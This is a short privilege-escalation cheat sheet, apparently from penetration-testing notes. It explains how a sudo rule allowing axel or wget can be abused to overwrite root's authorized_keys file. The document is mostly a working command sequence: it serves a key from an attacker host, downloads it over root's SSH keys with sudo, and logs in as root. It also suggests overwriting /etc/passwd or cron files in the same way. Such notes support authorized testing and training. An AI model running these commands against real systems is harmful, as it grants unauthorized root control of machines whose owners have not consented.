# Axel / wget sudo — Authorized Keys Overwrite

If `axel` or `wget` can be run as sudo (or run as root via a script), use it to overwrite `/root/.ssh/authorized_keys` with attacker-controlled content.

```bash
# Sudo entry: (root) NOPASSWD: /usr/bin/axel
# Host malicious authorized_keys on attacker machine
python3 -m http.server 8000
# Put your public key in ./authorized_keys

# Overwrite with axel
sudo axel -o /root/.ssh/authorized_keys http://<LHOST>:8000/authorized_keys

# Same with wget
sudo wget http://<LHOST>:8000/authorized_keys -O /root/.ssh/authorized_keys

# Then SSH in
ssh -i <PRIV_KEY> root@<TARGET>
```

Also works for overwriting `/etc/passwd` or `/etc/cron.d/` files if those paths are writable by the sudo rule.
